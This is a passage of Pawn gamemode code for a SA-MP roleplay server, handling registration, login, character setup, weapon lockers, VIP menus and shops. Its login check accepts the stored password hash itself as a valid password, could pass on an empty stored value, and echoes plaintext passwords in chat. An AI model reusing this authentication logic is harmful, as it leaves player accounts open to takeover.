	            SendClientMessage(playerid, COLOR_GRAD2, "Password can't be less than 4 characters.");
	            ShowDialog(playerid, 1);
	            return 1;
	        }
	        if(strlen(inputtext) > 256)
	        {
	            SendClientMessage(playerid, COLOR_GRAD2, "Password can't be longer than 256 characters.");
	            ShowDialog(playerid, 1);
	            return 1;
	        }
			new file[64], IP[16], string[128], password[256];
			format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
			if(!dini_Exists(file))
			{
				GetPlayerIp(playerid, IP, sizeof(IP));
				dini_Create(file);
				WP_Hash(password, sizeof(password), inputtext);
				dini_Set(file, "Password", password);
				dini_Set(file, "IP", IP);
				Player[playerid][pLevel] = 1;
				dini_IntSet(file, "Level", Player[playerid][pLevel]);
				format(string, sizeof(string), "** You have successfully registered in International Roleplay with {01A9DB}%s{FFFFFF} as your password.", inputtext);
 				SendClientMessage(playerid, COLOR_WHITE, string);
				format(Player[playerid][pIP], 16, "%s", dini_Get(file, "IP"));
				GetPlayerIp(playerid, IP, sizeof(IP));
				dini_Set(file, "IP", IP);
				Player[playerid][pGender] = dini_Int(file, "Gender");
				Player[playerid][pAge] = dini_Int(file, "Age");
				if(!Player[playerid][pGender] || !Player[playerid][pAge])
				{
				    ShowDialog(playerid, 3);
				}
				return i_changpasswordmofos(playerid, password);
			}
	    }
	    else
	    {
	        SendClientMessage(playerid, COLOR_DARKRED, "You have choosed to quit the server.");
	        Kick(playerid);
	    }
	}
	else if(dialogid == 2) // Login
	{
	    if(response)
	    {
   			new file[64], password[256], IP[16], password2[256];
			format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(playerid));
			WP_Hash(password2, sizeof(password2), inputtext);
			format(password, sizeof(password), "%s", dini_Get(file, "Password"));
			if(strcmp(password, inputtext,true) && strcmp(password, password2, true))
			{
				SendClientMessage(playerid, COLOR_DARKRED, "You have entered wrong password, Please try another one.");
			    ShowDialog(playerid, 2);
			    return 1;
			}
			else if(sscanf(inputtext, "s[128]", inputtext))
			{
			    SendClientMessage(playerid, COLOR_DARKRED, "You must enter a password in-order to login.");
			    ShowDialog(playerid, 2);
			    return 1;
			}
			else
			{
			    format(Player[playerid][pIP], 16, "%s", dini_Get(file, "IP"));
				GetPlayerIp(playerid, IP, sizeof(IP));
				dini_Set(file, "IP", IP);
				Player[playerid][pGender] = dini_Int(file, "Gender");
				Player[playerid][pAge] = dini_Int(file, "Age");
				if(!Player[playerid][pGender] || !Player[playerid][pAge])
				{
				    ShowDialog(playerid, 3);
				}
				else
				{
        			LoadChar(playerid);
				    SpawnPlayer(playerid);
				   // HideMainMenuGUI(playerid);
				}
			}
	    }
	    else
	    {
	        SendClientMessage(playerid, COLOR_DARKRED, "You have choosed to quit the server.");
	        Kick(playerid);
	    }
	}
	else if(dialogid == 3) // Male or Female
	{
	    if(response)
	    {
	    	if(VIP[playerid])
	        {
		        switch(listitem)
		        {
					case 0:
					{
						Player[playerid][pGender] = 1;
						SendClientMessage(playerid, COLOR_WHITE, "** You have adjusted your {01A9DB}character's {FFFFFF}gender to {01A9DB}male{FFFFFF}.");
					}
					case 1:
					{
					    Player[playerid][pGender] = 2;
					    SendClientMessage(playerid, COLOR_WHITE, "** You have adjusted your {01A9DB}character's {FFFFFF}gender to {01A9DB}female{FFFFFF}.");
					}
		        }
		        VIP[playerid] = 0;
            }
            else
            {
		        switch(listitem)
		        {
					case 0:
					{
						Player[playerid][pGender] = 1;
						SendClientMessage(playerid, COLOR_WHITE, "** You have adjusted your {01A9DB}character's {FFFFFF}gender to {01A9DB}male{FFFFFF}.");
					}
					case 1:
					{
					    Player[playerid][pGender] = 2;
					    SendClientMessage(playerid, COLOR_WHITE, "** You have adjusted your {01A9DB}character's {FFFFFF}gender to {01A9DB}female{FFFFFF}.");
					}
		        }
		        ShowDialog(playerid, 4);
	        }
	    }
	    else
	    {
	        if(!VIP[playerid])
	        {
		        SendClientMessage(playerid, COLOR_DARKRED, "You must choose your gender in-order to complete registration.");
		        ShowDialog(playerid, 3);
	        }
	        VIP[playerid] = 0;
	    }
	}
	else if(dialogid == 4)
	{
	    if(response)
	    {
			new age = strval(inputtext);
			if(VIP[playerid])
			{
				if(age < 15 || age > 80)
		        {
		            SendClientMessage(playerid, COLOR_DARKRED, "Age is between 15 to 80.");
		            ShowDialog(playerid, 4);
		        }
		        else
		        {
					new string[128];
					Player[playerid][pAge] = strval(inputtext);
					format(string, sizeof(string), "** You have adjusted your {01A9DB}character's {FFFFFF}age to {01A9DB}%d{FFFFFF}.", Player[playerid][pAge]);
					SendClientMessage(playerid, COLOR_WHITE, string);
		        }
		        VIP[playerid] = 0;
			}
			else
			{
		        if(age < 15 || age > 80)
		        {
		            SendClientMessage(playerid, COLOR_DARKRED, "Age is between 15 to 80.");
		            ShowDialog(playerid, 4);
		        }
		        else
		        {
					new string[128];
					Player[playerid][pAge] = strval(inputtext);
					format(string, sizeof(string), "** You have adjusted your {01A9DB}character's {FFFFFF}age to {01A9DB}%d{FFFFFF}.", Player[playerid][pAge]);
					SendClientMessage(playerid, COLOR_WHITE, string);
	                Player[playerid][pLoggedIn] = 1;
					Player[playerid][pSpawn] = 1;
					SpawnPlayer(playerid);//mofoss
					SetTimerEx("Tut1", 2000, false, "i", playerid);
					HideMainMenuGUI(playerid);
		        }
	        }
	    }
	    else
	    {
	        if(!VIP[playerid])
	        {
		        SendClientMessage(playerid, COLOR_DARKRED, "You must choose an age for your character in-order to complete registration.");
		        ShowDialog(playerid, 4);
	        }
	        VIP[playerid] = 0;
	    }
	}
	else if(dialogid == 5)
	{
	    new string[128];
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(!Player[playerid][pFacDuty])
	                {
	                    Player[playerid][pFacDuty] = 1;
	                    //SetPlayerColor(playerid, TRANSPARENT_BLUE);
	                    format(string, sizeof(string), "* %s grabs their badge, gun and mp5 from the locker.", GetName(playerid));
						SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
						GiveZamoraWeapon(playerid, 29, 500);
						GiveZamoraWeapon(playerid, 24, 200);
						SetPlayerArmour(playerid, 100);
						return 1;
	                }
	                else
	                {
      					Player[playerid][pFacDuty] = 0;
	                    //SetPlayerColor(playerid, TRANSPARENT_WHITE);
	                    SetPlayerArmour(playerid, 0);
	                    format(string, sizeof(string), "* %s places their badge in the locker.", GetName(playerid));
						SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
						return 1;
	                }
	            }
	            case 1:
	            {
	                ShowDialog(playerid, 43);
	            }
	            case 2:
	            {
	                ShowDialog(playerid, 44);
	            }
	            case 3:
	            {
	                ShowDialog(playerid, 45);
	            }
	            case 4:
	            {
	                ShowDialog(playerid, 46);
	            }
	        }
	    }
	}
	else if(dialogid == 6)
	{
	    new string[128];
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: // Nightstick
				{
				    GiveZamoraWeapon(playerid, 3, 1);
                    format(string, sizeof(string), "* %s grabs a Nightstick from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 1: // Mace
				{
				    GiveZamoraWeapon(playerid, 41, 500);
                    format(string, sizeof(string), "* %s grabs a Desert Eagle from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 2: // Desert EAgle
				{

				    GiveZamoraWeapon(playerid, 24, 500);
                    format(string, sizeof(string), "* %s grabs a Desert Eagle from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 3: // Shotgun
				{
				    GiveZamoraWeapon(playerid, 25, 200);
                    format(string, sizeof(string), "* %s grabs a Shotgun from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 4: // MP5
				{
				    GiveZamoraWeapon(playerid, 29, 500);
                    format(string, sizeof(string), "* %s grabs an MP5 from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 5: // M4
				{
				    GiveZamoraWeapon(playerid, 31, 500);
                    format(string, sizeof(string), "* %s grabs an M4 from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 6: // Combat Shotgun
				{
				    GiveZamoraWeapon(playerid, 27, 200);
                    format(string, sizeof(string), "* %s grabs a Combat Shotgun from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 7: // Sniper Rifle
				{
				    GiveZamoraWeapon(playerid, 34, 100);
                    format(string, sizeof(string), "* %s grabs a Sniper Rifle from the locker.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 8: // PainKiller
				{
				    SetPlayerHealth(playerid, 100);
                    format(string, sizeof(string), "* %s grabs a painkiller from the locker and swallows it.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
				case 9: // Vest
				{
				    SetPlayerArmour(playerid, 100);
                    format(string, sizeof(string), "* %s grabs a vest from the locker and puts it on.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				}
	        }
	    }
	}
	else if(dialogid == 7)
	{
	    if(response)
	    {
			new skin = strval(inputtext);
			if(skin < 0 || skin > 311)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Skin must be between 0 and 299.");
				ShowDialog(playerid, 7);
			}
			else
			{
				Player[playerid][pModel] = skin;
				SetPlayerSkin(playerid, skin);
				return 1;
			}
	    }
	}
	else if(dialogid == 9) // Mechanic
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: // Repair Vehicle
	            {
	                new string[128];
	                new Float:vH; GetVehicleHealth(GetPlayerVehicleID(playerid), vH);
					new Float:vel[3]; GetVehicleVelocity(GetPlayerVehicleID(playerid), vel[0], vel[1], vel[2]);
	                if(vH < 250) return SendClientMessage(playerid, COLOR_GRAD2, "The vehicle's engine is too hot to be repaired.");
	                if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You must be in the driver seat to repair a vehicle.");
					if(vel[0] != 0 || vel[1] != 0 || vel[2] != 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't repair a vehicle while it's moving.");
					RepairVehicle(GetPlayerVehicleID(playerid));
					Player[playerid][pJobSkill][JOB_MECHANIC] ++;
					PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
					format(string, sizeof(string), "* %s has completely repaired the vehicle they're inside.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	            }
	            case 1: // Add/Remove Nitros
	            {
	                new string[128];
					new Float:vel[3]; GetVehicleVelocity(GetPlayerVehicleID(playerid), vel[0], vel[1], vel[2]);
	                if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You must be in the driver seat to repair a vehicle.");
					if(vel[0] != 0 || vel[1] != 0 || vel[2] != 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't add/remove nitros to a vehicle while it's moving.");
					if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid),GetVehicleComponentType(1009)) != 1009) // Check if the vehicle has no nitro
			        {
			            AddVehicleComponent(GetPlayerVehicleID(playerid),1009);
			            PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
			            format(string, sizeof(string), "* %s has installed a 2x nitros cylinder into the vehicle.", GetName(playerid));
			        }
			        else
			        {
			            RemoveVehicleComponent(GetPlayerVehicleID(playerid),1009);
			            PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
			            format(string, sizeof(string), "* %s has removed the nitros cylinders from the vehicle.", GetName(playerid));
			        }
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	            }
	            case 2: // Add/Remove Hydraulics
	            {
	                new string[128];
					new Float:vel[3]; GetVehicleVelocity(GetPlayerVehicleID(playerid), vel[0], vel[1], vel[2]);
	                if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You must be in the driver seat to repair a vehicle.");
					if(vel[0] != 0 || vel[1] != 0 || vel[2] != 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't add/remove nitros to a vehicle while it's moving.");
					if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid),GetVehicleComponentType(1087)) != 1087) // Check if the vehicle has no hydraulics
			        {
			            AddVehicleComponent(GetPlayerVehicleID(playerid),1087);
			            PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
			            format(string, sizeof(string), "* %s has installed hydraulics system into the vehicle.", GetName(playerid));
			        }
			        else
			        {
			            RemoveVehicleComponent(GetPlayerVehicleID(playerid),1087);
			            PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
			            format(string, sizeof(string), "* %s has removed the hydraulics from the vehicle.", GetName(playerid));
			        }
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	            }
	            case 3: // Remove All Vehicle Components
	            {
                    new componentid, string[128];
                    for (new i; i < 14; i++)
                    {
                     	componentid = GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), i);
                     	if (componentid != 0)
                 		RemoveVehicleComponent(GetPlayerVehicleID(playerid), componentid);
                 		PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
                    }
                    format(string, sizeof(string), "* %s has removed the vehicle's components.", GetName(playerid));
           		    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
                }
	        }
	    }
	}
	else if(dialogid == 10) // Mechanic
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: // Repair Vehicle
	            {
	                new string[128];
					RepairVehicle(GetPlayerVehicleID(playerid));
					PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
					format(string, sizeof(string), "* %s has completely repaired the vehicle they're inside.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	            }
	            case 1: // Add/Remove Nitros
	            {
	                new string[128];
			        AddVehicleComponent(GetPlayerVehicleID(playerid),1010);
		            PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		            format(string, sizeof(string), "* %s has installed a 10x nitros cylinder into the vehicle.", GetName(playerid));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	            }
	            case 2: // Add/Remove Hydraulics
	            {
	                new string[128];
					if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid),GetVehicleComponentType(1087)) != 1087) // Check if the vehicle has no hydraulics
			        {
			            AddVehicleComponent(GetPlayerVehicleID(playerid),1087);
			            PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
			            format(string, sizeof(string), "* %s has installed hydraulics system into the vehicle.", GetName(playerid));
			        }
			        else
			        {
			            RemoveVehicleComponent(GetPlayerVehicleID(playerid),1087);
			            PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
			            format(string, sizeof(string), "* %s has removed the hydraulics from the vehicle.", GetName(playerid));
			        }
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	            }
	        }
	    }
	}
	else if(dialogid == 16) // VIP
	{
	    if(response)
	    {
		    switch(listitem)
		    {
		        case 0: // VIP Color
		        {
		            if(Player[playerid][pVIP] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a VIP.");
		            if(GetPlayerColor(playerid) != TRANSPARENT_VIP) {SetPlayerColor(playerid, TRANSPARENT_VIP); SendClientMessage(playerid, COLOR_VIP, "You have toggled your VIP name color on.");}
		            else {SetPlayerColor(playerid, TRANSPARENT_WHITE); SendClientMessage(playerid, COLOR_VIP, "You have toggled your VIP name color off.");}
                }
                case 1: // VIP Statistics
		        {
		            if(Player[playerid][pVIP] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a VIP.");
		            ShowDialog(playerid, 28);
                }
                case 2: // VIP Mechanic
		        {
		            if(Player[playerid][pVIP] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a VIP.");
		            ShowDialog(playerid, 9);
                }
                case 3: // VIP Clothes
		        {
		            if(Player[playerid][pVIP] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Silver VIP.");
		            ShowDialog(playerid, 7);
                }
                case 4: // VIP Tuning
		        {
		            if(Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Silver VIP.");
		            if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not driving a vehicle.");
					CarmodDialog(playerid);
                }
                case 5: // VIP Advertisement
		        {
		            if(Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Silver VIP.");
		            ShowDialog(playerid, 29);
                }
                case 6: // VIP Gunshop
		        {
		            if(Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Gold VIP.");
		            ShowDialog(playerid, 19);
                }
                case 7: // VIP Spawn
		        {
		            if(Player[playerid][pVIP] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Gold VIP.");
		            ShowDialog(playerid, 34);
                }
                case 8: // VIP Special Weapons
		        {
		            if(Player[playerid][pVIP] < 1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a VIP.");
		            ShowDialog(playerid, 52);
                }
                case 9: //veh model
		        {
		            if(Player[playerid][pVIP] < 4) return SendClientMessage(playerid, COLOR_GRAD2, "You are not Platinum VIP.");
		            if(GetPlayerVehicleID(playerid) != Player[playerid][pVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVeh] && GetPlayerVehicleID(playerid) != Player[playerid][pVVVVeh]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside your own vehicle.");
    				if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not driving a vehicle.");
		            ShowDialog(playerid, 51);
				}
		    }
		}
	}
	else if(dialogid == 17)
	{
	    if(response)
	    {
	        new skinid = strval(inputtext);
	        if(skinid < 0 || skinid > 299) return SendClientMessage(playerid, COLOR_GRAD2, "Skins are between 0 and 299.");
	        SetPlayerSkin(playerid, skinid);
	        Player[playerid][pModel] = skinid;
	    }
	}
	else if(dialogid == 18)
	{
	    if(response)
	    {
	        new string[128];
	        format(VIPName[playerid], MAX_PLAYER_NAME, "%s", inputtext);
	        format(string, sizeof(string), "AdminWarning: Platinum VIP %s has requested a free namechange to %s. (/approve namechange) (/deny namechange)", GetName(playerid), VIPName[playerid]);
	        SendAdminMessage(COLOR_ADMWARN,  string);
	    }
	}
	else if(dialogid == 19)
	{
	    if(response)
	    {
	        new string[128], wpnprice;
	        switch(listitem)
	        {
				case 0: // 9mm
				{
					if(Player[playerid][pVIP] == 3)
					{
			    	    if(Player[playerid][pMoney] < 75*1000/100)
						{
						   wpnprice = 1000;
						   format(string, sizeof(string), "You don't have that much money. ($%d)", 75*wpnprice/100);
						   SendClientMessage(playerid, COLOR_GRAD2, string);
						   return 1;
						}
		    		   	GiveZamoraMoney(playerid, 75*-1000/100);
			       		GiveZamoraWeapon(playerid, 22, 1500);
			       		format(string, sizeof(string), "* %s has bought a 9mm.", GetName(playerid));
 			    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 			    	}
 			    	else
 			    	{
                        if(Player[playerid][pMoney] < 1000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money.");
		    			GiveZamoraMoney(playerid, -1000);
			    		GiveZamoraWeapon(playerid, 22, 1500);
			    		format(string, sizeof(string), "* %s has bought a 9mm.", GetName(playerid));
 			    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 			    	}
				}
				case 1: // Desert eagle
				{
				    if(Player[playerid][pVIP] == 3)
					{
			    	    if(Player[playerid][pMoney] < 75*20000/100)
						{
						   wpnprice = 20000;
						   format(string, sizeof(string), "You don't have that much money. ($%d)", 75*wpnprice/100);
						   SendClientMessage(playerid, COLOR_GRAD2, string);
						   return 1;
						}
		    		   	GiveZamoraMoney(playerid, 75*-20000/100);
			       		GiveZamoraWeapon(playerid, 24, 1500);
			       		format(string, sizeof(string), "* %s has bought a desert eagle.", GetName(playerid));
 			    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 		 	    	}
 			    	else
 			    	{
                        if(Player[playerid][pMoney] <20000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money.");
		    			GiveZamoraMoney(playerid, -20000);
			    		GiveZamoraWeapon(playerid, 24, 1500);
			    		format(string, sizeof(string), "* %s has bought a desert eagle.", GetName(playerid));
 			    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 			    	}
				}
				case 2: // Shotgun
				{
					if(Player[playerid][pVIP] == 3)
					{
			    	    if(Player[playerid][pMoney] < 75*10000/100)
						{
						   wpnprice = 10000;
						   format(string, sizeof(string), "You don't have that much money. ($%d)", 75*wpnprice/100);
						   SendClientMessage(playerid, COLOR_GRAD2, string);
						   return 1;
						}
		    		   	GiveZamoraMoney(playerid, 75*-10000/100);
			       		GiveZamoraWeapon(playerid, 25, 1500);
			       		format(string, sizeof(string), "* %s has bought a shotgun.", GetName(playerid));
 			    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 			    	}
 			    	else
 			    	{
                        if(Player[playerid][pMoney] < 10000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money.");
		    			GiveZamoraMoney(playerid, -10000);
			    		GiveZamoraWeapon(playerid, 25, 1500);
			    		format(string, sizeof(string), "* %s has bought a shotgun.", GetName(playerid));
 			    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 			    	}
				}
				case 3: // MP5
				{
					if(Player[playerid][pVIP] == 3)
					{
			    	    if(Player[playerid][pMoney] < 75*10000/100)
						{
						   wpnprice = 10000;
						   format(string, sizeof(string), "You don't have that much money. ($%d)", 75*wpnprice/100);
						   SendClientMessage(playerid, COLOR_GRAD2, string);
						   return 1;
						}
		    		   	GiveZamoraMoney(playerid, 75*-10000/100);
			       		GiveZamoraWeapon(playerid, 29, 1500);
			       		format(string, sizeof(string), "* %s has bought a MP5.", GetName(playerid));
 			    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 			    	}
 			    	else
 			    	{
                        if(Player[playerid][pMoney] < 10000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money.");
		    			GiveZamoraMoney(playerid, -10000);
			    		GiveZamoraWeapon(playerid, 29, 1500);
			    		format(string, sizeof(string), "* %s has bought a shotgun.", GetName(playerid));
 			    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
 			    	}
				}
	        }
	    }
	}
	else if(dialogid == 20) // /ad
	{
	    new price = strlen(inputtext) * 3;
	    if(strlen(inputtext) == 0) return 1;
		if(strlen(inputtext) > 64) return SendClientMessage(playerid, COLOR_GRAD2, "Maximum characters allowed per advertisement are 64.");
		if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to put an advertisement.");
		if(HasAD[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, " You must wait for your advertisement to be published before making a new one.");
		if(AdQueue == MAX_ADS-1) return SendClientMessage(playerid, COLOR_GRAD2, " There are no queue slots for your advertisement.");
		// Advertisement
		HasAD[playerid] = 1;
		if(LastAd) SendClientMessage(playerid, COLOR_LIGHTBLUE, " Your advertisement has been placed in the queue, wait for about 60 seconds maximum.");
	    format(AD[AdQueue], 128, "Advertisement: %s, Contact: %s - Ph: %d", inputtext, GetName(playerid), Player[playerid][pPhone]);
		iAD[AdQueue] = 2;
		AdQueue++;
	    GiveZamoraMoney(playerid, -price);
	    NewsMoney = price;
		SendClientMessage(playerid, COLOR_WHITE, " You have been charged $3 per character.");
	}
	else if(dialogid == 22)
	{
	    if(response)
	    {
	       	if(Player[playerid][pMoney] < 3000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
	        switch(listitem)
	        {
				case 0:
				{
				    if(GetPlayerFightingStyle(playerid) == FIGHT_STYLE_NORMAL) return SendClientMessage(playerid, COLOR_GRAD2, "You are already using that fighting style.");
					SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now using the normal fighting style.");
					Player[playerid][pFightStyle] = FIGHT_STYLE_NORMAL;
				}
				case 1:
				{
				    if(GetPlayerFightingStyle(playerid) == FIGHT_STYLE_BOXING) return SendClientMessage(playerid, COLOR_GRAD2, "You are already using that fighting style.");
					SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now using the boxing fighting style.");
					Player[playerid][pFightStyle] = FIGHT_STYLE_BOXING;
				}
				case 2:
				{
				    if(GetPlayerFightingStyle(playerid) == FIGHT_STYLE_KUNGFU) return SendClientMessage(playerid, COLOR_GRAD2, "You are already using that fighting style.");
					SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now using the kung-fu fighting style.");
					Player[playerid][pFightStyle] = FIGHT_STYLE_KUNGFU;
				}
				case 3:
				{
				    if(GetPlayerFightingStyle(playerid) == FIGHT_STYLE_KNEEHEAD) return SendClientMessage(playerid, COLOR_GRAD2, "You are already using that fighting style.");
					SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now using the knee-head fighting style.");
					Player[playerid][pFightStyle] = FIGHT_STYLE_KNEEHEAD;
				}
				case 4:
				{
				    if(GetPlayerFightingStyle(playerid) == FIGHT_STYLE_GRABKICK) return SendClientMessage(playerid, COLOR_GRAD2, "You are already using that fighting style.");
					SetPlayerFightingStyle(playerid, FIGHT_STYLE_GRABKICK);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now using the grab-kick fighting style.");
					Player[playerid][pFightStyle] = FIGHT_STYLE_GRABKICK;
				}
				case 5:
				{
				    if(GetPlayerFightingStyle(playerid) == FIGHT_STYLE_ELBOW) return SendClientMessage(playerid, COLOR_GRAD2, "You are already using that fighting style.");
					SetPlayerFightingStyle(playerid, FIGHT_STYLE_ELBOW);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now using the elbow fighting style.");
					Player[playerid][pFightStyle] = FIGHT_STYLE_ELBOW;
				}
	        }
	        GiveZamoraMoney(playerid, -3000);
	    }
	}
	else if(dialogid == 23)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: toyslot[playerid] = 10; case 1: toyslot[playerid] = 11; case 2: toyslot[playerid] = 12; case 3: toyslot[playerid] = 13; case 4: toyslot[playerid] = 14;
	            case 5: toyslot[playerid] = 15; case 6: toyslot[playerid] = 16; case 7: toyslot[playerid] = 17; case 8: toyslot[playerid] = 18; case 9: toyslot[playerid] = 19;
	        }
	        new index = toyslot[playerid];
		    if(Player[playerid][pToyModel][index] == 0)
		    {
		        ShowDialog(playerid, 23);
		    }
		    else
		    {
	        	ShowDialog(playerid, 24);
	        }
	    }
	}
	else if(dialogid == 24)
	{
	    if(response)
	    {
			switch(listitem)
			{
				case 0:
				{
					if(!IsPlayerAttachedObjectSlotUsed(playerid, toyslot[playerid]))
					{
					    ShowDialog(playerid, 25);
					}
			    	else
			    	{
			    	    RemovePlayerAttachedObject(playerid, toyslot[playerid]);
			    	}
				}
				case 1:
				{
